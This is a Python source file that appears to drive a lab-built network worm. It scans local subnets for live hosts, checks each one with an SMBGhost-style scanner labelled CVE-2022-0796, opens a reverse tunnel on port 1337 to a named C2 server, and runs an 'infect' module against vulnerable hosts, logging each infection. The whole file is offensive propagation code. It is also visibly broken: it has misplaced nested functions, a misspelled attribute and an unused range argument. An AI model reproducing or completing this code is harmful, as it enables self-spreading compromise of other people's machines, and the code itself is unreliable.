import pickle
import armory.SMBGhost.cve20220796scanner as cve20220796scanner
from sniff import sniff
from infect import infect
import tunnel as comm


def main(ip_range):
    targets = ip_range
    c2_server = "192.168.56.108"
    not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
    network = sniff()
    log = load_log()
    for local_ip in network.get_host_networks().keys():
        for target_ip in network.get_alive_hosts(local_ip):
            target_port_details = network.get_host_port_details(target_ip)
            print("Scanning Host:{} for port service".format(target_ip.address))
            if target_ip.address in target_port_details.keys():
                for running_port in target_port_details[target_ip.address]["ports"]:
                    print("Host: {} - running port:{}".format(target_ip.address, running_port))
                    if not target_ip.address in not_testing_targets:
                        attack = cve20220796scanner.is_vulnerable(target_ip.address)
                        if attack:
                            print("start to attack")
                            local_ip = "0.0.0.0"
                            print("attacking port{}".format(running_port))
                            listening_port = 1337
                            tunnel = comm.tunnel(local_ip, listening_port)
                            tunnel.start()
                            infection = infect(target_ip.address,running_port, local_ip, listening_port)
                            infection.start()
                            tunnel.close_client_connection(target_ip.address)
                            if local_ip in log:
                                log[local_ip]["infects"].update({target_ip.addres:True})
                            else:
                                log[local_ip] = {"status":True,"infects":{}}

    def load_log():
        log = {}
        with open("container/infect.log",'rb') as data:
            log = pickle.loads(log.read())
        return log
            
            
    def unload_log(log:dict):
        with open("container/infect.log", 'wb') as log_file:
            data = pickle.dumps(log)
            log_file.write(data)
        


if __name__=='__main__':
    #ip_range = sys.argv[1]
    ip_range=2
    main(ip_range)